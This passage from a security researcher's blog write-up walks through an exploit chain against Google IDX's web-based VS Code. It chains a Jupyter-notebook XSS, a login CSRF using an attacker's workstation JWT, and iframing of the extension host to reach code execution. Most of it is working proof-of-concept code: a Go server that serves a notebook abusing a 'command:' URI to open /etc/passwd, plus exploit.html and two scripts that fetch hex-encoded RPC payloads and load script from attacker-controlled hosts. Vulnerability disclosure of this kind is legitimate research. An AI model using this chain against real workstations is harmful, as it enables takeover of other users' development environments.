            <span class="c1">// console.log("%csent: " + decode(rawmsg), "color: gray")</span>
            <span class="nx">port</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">)</span>
            <span class="nx">counter</span><span class="o">++</span>
            <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250730105114.png" alt="Pasted image 20250730105114.png" />
<br /></p>

<hr />

<h2 id="saga-continues">Saga Continues..</h2>

<p>Well the story doesn‚Äôt ends here and no you don‚Äôt need to wait another week for  remaining part. Will continue from here only.</p>

<p>Even after I did confirmed and managed to build a working POC for Google IDX we still need to make it reproducible in default case as for testing locally I had disabled clickjacking protections which are enforced from the CSP</p>

<p>This is where Sreeram‚Äôs xss comes into play</p>

<h3 id="xss-on-cloudworkstationsgoogleusercontentcom">XSS on <code class="language-plaintext highlighter-rouge">*.cloudworkstations.googleusercontent.com</code></h3>

<p>Jupyter Notebook comes to the rescue here,</p>

<p>Sample <code class="language-plaintext highlighter-rouge">*.ipynb</code> content that would allow XSS, applications supporting such files would often try to sanitize the markdown content or would render the html in a sandbox origin to avoid any xss issues.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
 </span><span class="nl">"cells"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
   </span><span class="nl">"cell_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"code"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"execution_count"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
   </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"37f81a85"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"metadata"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
   </span><span class="nl">"outputs"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
     </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"text/html"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
       </span><span class="s2">"&lt;script&gt;console.log('XSS in : '+ window.origin)&lt;/script&gt;"</span><span class="w">
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"text/plain"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
     </span><span class="p">},</span><span class="w">
     </span><span class="nl">"metadata"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
     </span><span class="nl">"output_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"display_data"</span><span class="w">
    </span><span class="p">}</span><span class="w">
   </span><span class="p">],</span><span class="w">
   </span><span class="nl">"source"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
  </span><span class="p">}</span><span class="w">
 </span><span class="p">]</span><span class="w">
 </span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>In case IDX they are using a sandbox domain to render this <a href="https://0dmducp84q2pdhnsc5mctm6dkrg5796rjm7g95rga4s028s2gn3i.cloudworkstations.googleusercontent.com">https://0dmducp84q2pdhnsc5mctm6dkrg5796rjm7g95rga4s028s2gn3i.cloudworkstations.googleusercontent.com</a></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250730075551.png" alt="Pasted image 20250730075551.png" />
<br />
<code class="language-plaintext highlighter-rouge">*.cloudworkstations.googleusercontent.com</code> wow so this is what we were looking for. As the frame-ancestors directive includes this wildcard domain it‚Äôs possible to use the xss via the Jupyter notebook to iframe the <code class="language-plaintext highlighter-rouge">webWorkerExtensionHostIframe.html</code> endpoint.</p>

<p>But there is one bummer, how can we place a malicious Jupyter notebook file in victim‚Äôs IDX instance.  Sreeram and Sivanesh  again comes to the rescue.</p>

<p>There‚Äôs actually one endpoint I should call it parameter which allows you to specify the location of the <code class="language-plaintext highlighter-rouge">ipynb</code> file which will automatically be fetched and rendered. This was originally found by Project Zero</p>

<center><a href="https://github.com/google/security-research/security/advisories/GHSA-pw56-c55x-cm9m" class="card-preview" data-size="large" target="_blank">
  Loading preview...
</a></center>

<p><br />
<br />
The same parameter also accepted http urls, so an attacker could specify his own server there which will be fetched and when rendered would allow xss. Below is the web server which they used and along with that they also found a RCE gadget related to handling of <code class="language-plaintext highlighter-rouge">command:</code> uris, these are special urls which are handled internally by VSCode you can check the advisory for details it‚Äôs a very cool gadget</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">// https://golang.org</span>
<span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="s">"net/http"</span>

<span class="k">const</span> <span class="n">file</span> <span class="o">=</span> <span class="s">`{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "&lt;img src=a onerror=\"let q = document.createElement('a');q.href='command:workbench.action.terminal.new?
%7B%22config%22%3A%7B%22executable%22%3A%22vim%22%2C%22args%22%3A%5B%22%2Fetc%2Fpasswd%22%5D%
7D%7D';document.body.appendChild(q);q.click()\"/&gt;"
   ]
  }
]}`</span>

<span class="k">func</span> <span class="n">Do</span><span class="p">()</span> <span class="p">(</span><span class="n">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="n">http</span><span class="o">.</span><span class="n">ListenAndServe</span><span class="p">(</span><span class="s">":http-alt"</span> <span class="c">/* 8080 */</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">HandlerFunc</span><span class="p">(</span><span class="k">func</span><span class="p">(</span><span class="n">rw</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">rq</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">rw</span><span class="o">.</span><span class="n">Header</span><span class="p">()</span><span class="o">.</span><span class="n">Set</span><span class="p">(</span><span class="s">"Access-Control-Allow-Origin"</span><span class="p">,</span> <span class="s">"*"</span><span class="p">)</span>
		<span class="n">rw</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="n">file</span><span class="p">))</span>
	<span class="p">}))</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">Do</span><span class="p">();</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">command:</code> uri is an interesting attack surface you can find some other blogposts as well related to this  for eg</p>

<center><a href="https://www.sonarsource.com/blog/VSCode-security-markdown-vulnerabilities-in-extensions/" class="card-preview" data-size="large" target="_blank">
  Loading preview...
</a></center>
<p><br />
<br />
VSCode has so many features so if you are able to find an xss in the same origin as the VSCode web then it‚Äôs game over it will be an escalation of XSS to RCE just like we see in Electron application.</p>

<p>In case of IDX it doesn‚Äôt supports external urls :(  we are limited to local filesystem only, so what we do here. Well the duo (Sreeram and Sivanesh) has a solution for this problem as well can you guess what is it? A <strong>Login CSRF</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?payload=%5B%5B%22openFile%22,%22https://%5Bserver_location_goes_here%5D/something.ipynb%22

[["openFile","https://[server_location_goes_here]/something.ipynb"]

Change the location to match the absoule path in local file system 
</code></pre></div></div>

<p>Although the attacker could get an XSS in¬†<code class="language-plaintext highlighter-rouge">*.cloudworkstations.googleusercontent.com</code>¬†like described above, it is only accessible to the attacker, making it a self-XSS. To exploit it on the victim‚Äôs browser, the attacker needs to exploit a login CSRF in the IDX workstation.</p>

<p>This is possible by using the GET parameter¬†<code class="language-plaintext highlighter-rouge">_workstationAccessToken</code>. When the victim sends a GET request with the attacker‚Äôs <code class="language-plaintext highlighter-rouge">WorkstationJwt</code> cookie in this parameter, they would be able to access the attacker‚Äôs IDX workstation, making the self-XSS exploitable in the victim‚Äôs browser.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kd">var</span> <span class="nx">attacker_idx_workstation_domain</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">idx-attacker-1722601960617.cluster-bec2e4635ng44w7ed22sa22hes.cloudworkstations.dev</span><span class="dl">"</span>
<span class="kd">var</span> <span class="nx">path_to_exploit_ipynb</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/home/shirley/attacker/xss.ipynb</span><span class="dl">"</span><span class="o">|</span>
<span class="kd">var</span> <span class="nx">attacker_workstation_jwt_cookie</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3....</span><span class="dl">"</span>

<span class="kd">var</span> <span class="nx">folder</span> <span class="o">=</span> <span class="nx">path_to_exploit_ipynb</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">path_to_exploit_ipynb</span><span class="p">.</span><span class="nf">lastIndexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">))</span>

<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="o">+</span><span class="nx">attacker_idx_workstation_domain</span><span class="o">+</span><span class="dl">"</span><span class="s2">/?payload=[[%22openFile%22,%22VSCode-remote://</span><span class="dl">"</span><span class="o">+</span><span class="nx">path_to_exploit_ipynb</span><span class="o">+</span><span class="dl">"</span><span class="s2">%22]]&amp;_workstationAccessToken=</span><span class="dl">"</span><span class="o">+</span><span class="nx">attacker_workstation_jwt_cookie</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;folder=</span><span class="dl">"</span><span class="o">+</span><span class="nx">folder</span><span class="p">;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">vscode-remote</code> scheme actually points to the local file system only</p>

<p>Example final url which  the attacker needs to send to the victim:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://idx-attacker-1722601960617.cluster-bec2e4635ng44w7ed22sa22hes.cloudworkstations.dev/?payload=[[%22openFile%22,%22VSCode-remote:///home/shirley/attacker/xss.ipynb%22]]&amp;_workstationAccessToken=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3....&amp;folder=/home/shirley/attacker
</code></pre></div></div>
<p>A sweet chain which includes the login CSRF as well the initial XSS which would trigger in the context of <code class="language-plaintext highlighter-rouge">*.cloudworkstations.googleusercontent.com</code> origin.</p>

<hr />

<h2 id="putting-everything-together">Putting Everything together</h2>

<blockquote>

  <p>exploit.html</p>
</blockquote>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nf">openwindow</span><span class="p">(){</span>
    <span class="kd">var</span> <span class="nx">attacker_idx_workstation_domain</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">idx-attacker-1722601960617.cluster-bec2e4635ng44w7ed22sa22hes.cloudworkstations.dev</span><span class="dl">"</span>
    <span class="kd">var</span> <span class="nx">path_to_exploit_ipynb</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/home/user/attacker/xss.ipynb</span><span class="dl">"</span>
    <span class="kd">var</span> <span class="nx">attacker_workstation_jwt_cookie</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL2Nsb3VkLmdvb2dsZS5jb20vd29ya3N0YXRpb25zIiwiYXVkIjoiaWR4LWF0dGFja2VyLTE3MjI2MDE5NjA2MTcuY2x1c3Rlci1iZWMyZTQ2MzVuZzQ0dzdlZDIyc2EyMmhlcy5jbG91ZHdvcmtzdGF0aW9ucy5kZXYiLCJpYXQiOjE3MjI2MDIyMDcsImV4cCI6MTcyMjYwMjI2N30.JFihvbvC0vwDI3dEj_K5dMuM6XUaYp6yCdClbIztMQnWRG-GHFmrySbDoQCFUrzmhbMcPGqp0Ftf_n-I2XiLH4t2vdNRL6I3B2XUmjC3y16J-ToqDhXpEE7iXCZWxH6nzhEoJ6JVxlqm23FAZ9inmViV2irtL1BePHPtlBdVP3WJJ0vlJGynvW12xNS9VqAIeo1LjUKSLdmFcSACiYtNVfkzHmqkpwqSowx_VF8Cq6F6YOhwE4sX23p2F_cRsRKBkOecUAc2A-iKFOJ0VbyMeWDOrhV9ayqPuNzab6I_cdoZvSmEDBqgFjxSRg86_yFnMyxwPno4gy8ZuJ3-e8TNTw</span><span class="dl">"</span>

    <span class="kd">var</span> <span class="nx">folder</span> <span class="o">=</span> <span class="nx">path_to_exploit_ipynb</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">path_to_exploit_ipynb</span><span class="p">.</span><span class="nf">lastIndexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">))</span>
    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="o">+</span><span class="nx">attacker_idx_workstation_domain</span><span class="o">+</span><span class="dl">"</span><span class="s2">/?payload=[[%22openFile%22,%22VSCode-remote://</span><span class="dl">"</span><span class="o">+</span><span class="nx">path_to_exploit_ipynb</span><span class="o">+</span><span class="dl">"</span><span class="s2">%22]]&amp;_workstationAccessToken=</span><span class="dl">"</span><span class="o">+</span><span class="nx">attacker_workstation_jwt_cookie</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;folder=</span><span class="dl">"</span><span class="o">+</span><span class="nx">folder</span><span class="p">;</span>
    <span class="nx">x</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>

    <span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">action</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">redirect</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">});</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">openwindow()</span><span class="nt">&gt;</span>click<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>
<p><br />
The variable naming should be self explanatory. It populates the url to include the jwt cookie and the path to the <code class="language-plaintext highlighter-rouge">ipynb</code> file which contains the exploit code. We are opening this url in a new window.</p>

<p>At the same we are also setting up a message listener which is meant for redirecting this page.</p>

<blockquote>

  <p>script1.js</p>
</blockquote>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Change this value to the victim's IDX workstation domain</span>
<span class="kd">var</span> <span class="nx">victim_idx_workstation_domain</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">idx-victim-1722601902976.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev</span><span class="dl">'</span>

<span class="nx">parentOrigin</span> <span class="o">=</span> <span class="nx">parent</span><span class="p">.</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">origin</span>

<span class="nx">ifr</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)</span>
<span class="nx">ifr</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="o">+</span><span class="nx">victim_idx_workstation_domain</span><span class="o">+</span><span class="dl">"</span><span class="s2">/oss-6a96d5dc452450b1ad67667c4e503a014ef0a908/static/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?parentOrigin=</span><span class="dl">"</span><span class="o">+</span><span class="nx">parentOrigin</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">ifr</span><span class="p">)</span>

<span class="c1">// --- start utils ---</span>

<span class="kd">const</span> <span class="nx">decoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextDecoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">decode</span> <span class="o">=</span> <span class="nx">decoder</span><span class="p">.</span><span class="nx">decode</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="nx">decoder</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">encoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextEncoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">encode</span> <span class="o">=</span> <span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">encoder</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">str</span><span class="p">).</span><span class="nx">buffer</span>

<span class="c1">// Converts hex to ArrayBuffer</span>
<span class="kd">function</span> <span class="nf">hex2buf</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">hex</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nx">length</span> <span class="o">%</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nx">hex</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/</span><span class="se">[\d</span><span class="sr">a-f</span><span class="se">]{2}</span><span class="sr">/gi</span><span class="p">).</span><span class="nf">map</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">h</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">h</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
    <span class="p">})).</span><span class="nx">buffer</span>
<span class="p">}</span>

<span class="c1">// Converts ArrayBuffer to hex</span>
<span class="kd">function</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">[...</span><span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)].</span><span class="nf">map</span><span class="p">(</span><span class="nx">x</span> <span class="o">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">padStart</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="p">)).</span><span class="nf">join</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Returns text output of a fetch response</span>
<span class="k">async</span> <span class="kd">function</span> <span class="nf">fetch_text</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span>
    <span class="k">return</span> <span class="nx">resp</span><span class="p">.</span><span class="nf">text</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">sleep</span><span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">)</span>
    <span class="p">})</span>
<span class="p">}</span>

<span class="c1">// --- end utils ---</span>

<span class="c1">// Initiates postmessage communications</span>
<span class="kd">function</span> <span class="nf">send_map</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Map</span><span class="p">()</span>
    <span class="kd">const</span> <span class="nx">channel</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MessageChannel</span><span class="p">()</span>
    <span class="nx">map</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">idx.idx-web-ide</span><span class="dl">"</span><span class="p">,</span> <span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">)</span>
    <span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">({</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">VSCode.init</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:</span> <span class="nx">map</span> <span class="p">},</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span> <span class="p">[</span><span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">])</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">send_called</span> <span class="o">=</span> <span class="kc">false</span>
<span class="c1">// Waits for the init message and then calls send_everything()</span>
<span class="kd">function</span> <span class="nf">port_listener</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">rawmsg</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span>
    <span class="c1">// console.log("%crecived: " + decode(rawmsg), "color: gray")</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">send_called</span> <span class="o">&amp;&amp;</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">)</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">02</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// The message is an init message</span>
        <span class="nx">send_called</span> <span class="o">=</span> <span class="kc">true</span>
        <span class="nf">send_everything</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Fetches a list of postmessage data and sends them</span>
<span class="k">async</span> <span class="kd">function</span> <span class="nf">send_everything</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">ms</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nf">now</span><span class="p">();</span>
    <span class="c1">// One of the postmessages in the below file, contains a link to the JS file which contains the XSS payload that would be executed in the victim's idx workstation</span>
    <span class="kd">const</span> <span class="nx">hex_lines</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nf">fetch_text</span><span class="p">(</span><span class="s2">`https://gist.githubusercontent.com/Sudistark/a643a2e8216e5a93f92bde9121333337/raw/b100c95bcb227ad70e64518ff370f3a07cc7a23f/pwn-idx.txt?cacheB=</span><span class="p">${</span><span class="nx">ms</span><span class="p">}</span><span class="s2">`</span><span class="p">)).</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">)</span>
    <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
    <span class="k">for </span><span class="p">(</span><span class="nx">hex</span> <span class="k">of</span> <span class="nx">hex_lines</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">rawmsg</span> <span class="o">=</span> <span class="nf">hex2buf</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span>
        <span class="c1">// console.log("%csent: " + decode(rawmsg), "color: gray")</span>
        <span class="nx">port</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">)</span>
        <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Obtains the port information and calls the send_map()</span>
<span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span> <span class="nf">add_port</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">window</span><span class="p">.</span><span class="nf">removeEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">add_port</span><span class="p">)</span>
        <span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="nx">port</span>
        <span class="nx">port</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="nx">port_listener</span>
        <span class="nf">send_map</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">})</span>
</code></pre></div></div>

<p>Everything is same as Matan‚Äôs poc only.</p>

<p><a href="https://gist.githubusercontent.com/Sudistark/a643a2e8216e5a93f92bde9121333337/raw/b100c95bcb227ad70e64518ff370f3a07cc7a23f/pwn-idx.txt">https://gist.githubusercontent.com/Sudistark/a643a2e8216e5a93f92bde9121333337/raw/b100c95bcb227ad70e64518ff370f3a07cc7a23f/pwn-idx.txt</a> contains the hex encoded serialized rpc messages to trigger the XSS.</p>

<blockquote>

  <p>script2.js</p>
</blockquote>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if </span><span class="p">(</span><span class="nx">top</span><span class="p">.</span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">)</span> <span class="p">{</span>
   <span class="c1">// Change this to the full URL pointing to the script2.js file</span>
    <span class="kd">var</span> <span class="nx">script_url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://&lt;attacker-host&gt;/script1.js</span><span class="dl">'</span><span class="p">;</span>

    <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="na">action</span><span class="p">:</span><span class="dl">"</span><span class="s2">redirect</span><span class="dl">"</span><span class="p">,</span><span class="na">url</span><span class="p">:</span><span class="nx">origin</span><span class="p">};</span>
    <span class="nx">top</span><span class="p">.</span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">sendExploit</span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">clearInterval</span><span class="p">(</span><span class="nx">checkLocation</span><span class="p">);</span>
        <span class="nx">top</span><span class="p">.</span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">`&lt;iframe srcdoc="sss&lt;script src='</span><span class="p">${</span><span class="nx">script_url</span><span class="p">}</span><span class="s2">'&gt;&lt;/script&gt;"/&gt;`</span>
    <span class="p">}</span>

    <span class="nx">checkLocation</span> <span class="o">=</span> <span class="nf">setInterval</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">top</span><span class="p">.</span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nx">origin</span> <span class="o">==</span> <span class="nx">origin</span><span class="p">){</span>
        <span class="nf">sendExploit</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">},</span> <span class="mi">100</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The exploit code in <code class="language-plaintext highlighter-rouge">ipynb</code> file would execute the above code , it basically loads the <code class="language-plaintext highlighter-rouge">script2.js</code> and also sends a <em>postMessage</em> to the <code class="language-plaintext highlighter-rouge">top.window.opener</code> page which points to the initial exploit.html endpoint. We are redirecting that page to the same <code class="language-plaintext highlighter-rouge">*.cloudworkstations.googleusercontent.com</code> origin as rest of exploitation will be happening there only</p>

